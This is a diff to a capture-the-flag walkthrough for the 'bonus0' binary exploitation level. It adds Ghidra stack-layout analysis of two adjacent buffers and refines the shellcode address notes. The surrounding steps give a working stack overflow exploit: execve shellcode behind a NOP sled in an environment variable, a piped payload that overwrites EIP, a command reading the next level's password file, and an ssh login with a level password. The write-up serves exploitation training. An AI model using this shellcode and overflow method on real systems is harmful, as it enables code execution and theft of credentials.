@@ -15,18 +15,19 @@
    ssh bonus0@localhost -p 2222
    Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 
-4. Verify with dynamic analysis:
-   Run ltrace to observe the vulnerability:
+4. Analyze stack layout with Ghidra:
+   From the Decompile view:
    
-   ltrace ./bonus0
-   Input 1: AAAAAAAAAAAAAAAAAAAA (20 A's - no null terminator added by strncpy)
-   Input 2: BBBBBBBBBBBBBBBBBBBB (20 B's - no null terminator added by strncpy)
+   pp() function:
+   - first_input (local_34): EBP - 0x30 (offset -48)
+   - second_input (local_20): EBP - 0x1c (offset -28)
+   - Distance: 20 bytes (confirms adjacent buffers)
    
-   Observe:
-   - strncpy(0xbffffbf8, "AAAAAAAAAAAAAAAAAAAA", 20) - no null added
-   - strncpy(0xbffffc0c, "BBBBBBBBBBBBBBBBBBBB", 20) - no null added
-   - strcpy() copies "AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBB..." - reads past first_input!
-   - Program crashes with SIGSEGV
+   main() function:
+   - buffer[54] (local_3a): ESP + 0x16 (offset +22)
+   - Stack frame: 64 bytes allocated (SUB ESP, 0x40)
+   
+   Confirms: 61 bytes written into 54-byte buffer = 7-byte overflow
 
 5. Calculate offsets and prepare shellcode:
    The EIP overwrite occurs at bytes 9-12 of the second input.
@@ -35,20 +36,22 @@
    - Input 1: 20 bytes (any data)
    - Input 2: 9 bytes padding + 4 bytes (return address) + 7 bytes overflow
    
-   Since we need shellcode, use environment variable method with NOP sled.
-   The shellcode address will be approximately 0xbffffd58 (may vary slightly).
+   Environment variable shellcode address:
+   - SHELLCODE variable location: ~0xbffffd44 (high stack, no ASLR)
+   - Skip "SHELLCODE=" prefix: +20 bytes = 0xbffffd58
+   - 200-byte NOP sled provides large landing zone
 
 6. Execute the exploit:
    Export the shellcode as an environment variable:
    export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
    
-   Run the exploit (using address 0xbffffd58 found in step 4):
+   Run the exploit:
    (python -c 'print "A"*20'; python -c 'print "B"*9 + "\x58\xfd\xff\xbf" + "C"*7'; cat) | ./bonus0
    
    Note: The 'cat' command keeps stdin open for shell interaction.
-    
-    Shellcode: 24-byte null-free execve from level2 (Exploit-DB #42428)
-    See level2 documentation for detailed shellcode analysis.
+   
+   Shellcode: 24-byte null-free execve from level2 (Exploit-DB #42428)
+   See level2 documentation for detailed shellcode analysis.
 
 7. Read the password:
    cat /home/user/bonus1/.pass
